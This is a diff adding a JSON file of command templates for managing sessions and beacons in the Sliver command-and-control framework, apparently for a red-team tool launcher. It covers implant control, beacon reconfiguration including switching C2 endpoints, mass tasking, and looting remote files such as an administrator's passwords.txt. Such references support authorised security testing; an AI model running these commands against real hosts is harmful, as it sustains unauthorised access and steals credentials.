@@ -1,0 +1,303 @@
+{
+  "title": "Sliver - Session & Beacon Management",
+  "commands": [
+    {
+      "args": [],
+      "title": "List all active beacons",
+      "template": "beacons"
+    },
+    {
+      "args": [
+        {
+          "name": "session_id",
+          "description": "Beacon ID to kill",
+          "default": "12345678"
+        }
+      ],
+      "title": "Kill a specific beacon",
+      "template": "beacons -k {session_id}"
+    },
+    {
+      "args": [],
+      "title": "Kill all active beacons",
+      "template": "beacons -K"
+    },
+    {
+      "args": [
+        {
+          "name": "session_id",
+          "description": "Beacon ID to remove",
+          "default": "12345678"
+        }
+      ],
+      "title": "Remove a beacon from the list",
+      "template": "beacons rm {session_id}"
+    },
+    {
+      "args": [],
+      "title": "Prune stale/dead beacons automatically",
+      "template": "beacons prune"
+    },
+    {
+      "args": [],
+      "title": "Watch beacons (live refresh mode)",
+      "template": "beacons watch"
+    },
+    {
+      "args": [
+        {
+          "name": "session_id",
+          "description": "Beacon ID to interact with",
+          "default": "12345678"
+        }
+      ],
+      "title": "Interact with a beacon (via beacons command)",
+      "template": "beacons -i {session_id}"
+    },
+    {
+      "args": [],
+      "title": "List all active interactive sessions",
+      "template": "sessions"
+    },
+    {
+      "args": [
+        {
+          "name": "session_id",
+          "description": "Session ID to kill",
+          "default": "12345678"
+        }
+      ],
+      "title": "Kill a specific session",
+      "template": "sessions -k {session_id}"
+    },
+    {
+      "args": [],
+      "title": "Kill all active sessions",
+      "template": "sessions -K"
+    },
+    {
+      "args": [],
+      "title": "Clean out all dead/stale sessions",
+      "template": "sessions -C"
+    },
+    {
+      "args": [],
+      "title": "Prune stale/dead sessions",
+      "template": "sessions prune"
+    },
+    {
+      "args": [
+        {
+          "name": "session_id",
+          "description": "Session ID to interact with",
+          "default": "12345678"
+        }
+      ],
+      "title": "Interact with a session (via sessions command)",
+      "template": "sessions -i {session_id}"
+    },
+    {
+      "args": [
+        {
+          "name": "session_id",
+          "description": "The ID of the session or beacon",
+          "default": "12345678"
+        }
+      ],
+      "title": "Interact with a session or beacon",
+      "template": "use {session_id}"
+    },
+    {
+      "args": [
+        {
+          "name": "session_id",
+          "description": "Session/beacon ID",
+          "default": "12345678"
+        },
+        {
+          "name": "new_name",
+          "description": "New friendly name",
+          "default": "DC01_Admin"
+        }
+      ],
+      "title": "Rename a session/beacon for easier tracking",
+      "template": "rename {session_id} {new_name}"
+    },
+    {
+      "args": [],
+      "title": "Background current session (return to server console)",
+      "template": "background"
+    },
+    {
+      "args": [],
+      "title": "Close session without killing the remote process",
+      "template": "close"
+    },
+    {
+      "args": [],
+      "title": "Kill the remote implant process (does not delete file)",
+      "template": "kill"
+    },
+    {
+      "args": [],
+      "title": "Force kill the remote implant (no cleanup)",
+      "template": "kill -F"
+    },
+    {
+      "args": [],
+      "title": "Get detailed info about the active session",
+      "template": "info"
+    },
+    {
+      "args": [],
+      "title": "Convert beacon to interactive session",
+      "template": "interactive"
+    },
+    {
+      "args": [
+        {
+          "name": "delay",
+          "description": "Delay before opening session",
+          "default": "5s"
+        }
+      ],
+      "title": "Convert beacon to session with delay",
+      "template": "interactive --delay {delay}"
+    },
+    {
+      "args": [],
+      "title": "List all pending/completed beacon tasks",
+      "template": "tasks"
+    },
+    {
+      "args": [
+        {
+          "name": "task_id",
+          "description": "Task ID to cancel",
+          "default": "87654321"
+        }
+      ],
+      "title": "Cancel a pending beacon task",
+      "template": "tasks cancel {task_id}"
+    },
+    {
+      "args": [
+        {
+          "name": "task_id",
+          "description": "Task ID to fetch",
+          "default": "87654321"
+        }
+      ],
+      "title": "Fetch details/output of a completed task",
+      "template": "tasks fetch {task_id}"
+    },
+    {
+      "args": [
+        {
+          "name": "new_interval",
+          "description": "New beacon interval",
+          "default": "120s"
+        }
+      ],
+      "title": "Reconfigure beacon check-in interval",
+      "template": "reconfig --beacon-interval {new_interval}"
+    },
+    {
+      "args": [
+        {
+          "name": "new_jitter",
+          "description": "New jitter value",
+          "default": "30s"
+        }
+      ],
+      "title": "Reconfigure beacon jitter",
+      "template": "reconfig --beacon-jitter {new_jitter}"
+    },
+    {
+      "args": [
+        {
+          "name": "new_c2",
+          "description": "New C2 URI to switch to",
+          "default": "mtls://192.168.1.100:8888"
+        }
+      ],
+      "title": "Switch active beacon to a different C2 endpoint",
+      "template": "reconfig --c2-uri {new_c2}"
+    },
+    {
+      "args": [
+        {
+          "name": "new_reconnect",
+          "description": "New reconnect interval",
+          "default": "10s"
+        }
+      ],
+      "title": "Change reconnect interval for active beacon/session",
+      "template": "reconfig --reconnect-interval {new_reconnect}"
+    },
+    {
+      "args": [
+        {
+          "name": "command",
+          "description": "Command to task to all beacons",
+          "default": "info"
+        }
+      ],
+      "title": "Send a command to multiple beacons/sessions at once",
+      "template": "taskmany {command}"
+    },
+    {
+      "args": [],
+      "title": "List the host database",
+      "template": "hosts"
+    },
+    {
+      "args": [
+        {
+          "name": "host_id",
+          "description": "Host ID to remove",
+          "default": "abcdef12"
+        }
+      ],
+      "title": "Remove a host from the database",
+      "template": "hosts rm {host_id}"
+    },
+    {
+      "args": [],
+      "title": "Start threat intel monitoring for implant detection",
+      "template": "monitor start"
+    },
+    {
+      "args": [],
+      "title": "Stop threat intel monitoring",
+      "template": "monitor stop"
+    },
+    {
+      "args": [
+        {
+          "name": "file_path",
+          "description": "Local file path to add to loot",
+          "default": "/tmp/creds.txt"
+        }
+      ],
+      "title": "Add a local file to the loot store",
+      "template": "loot local {file_path}"
+    },
+    {
+      "args": [
+        {
+          "name": "remote_file",
+          "description": "Remote file path on target",
+          "default": "C:\\Users\\Administrator\\Desktop\\passwords.txt"
+        }
+      ],
+      "title": "Add a remote file (from active session) to loot",
+      "template": "loot remote {remote_file}"
+    },
+    {
+      "args": [],
+      "title": "Fetch and display loot from the loot store",
+      "template": "loot fetch"
+    }
+  ]
+}
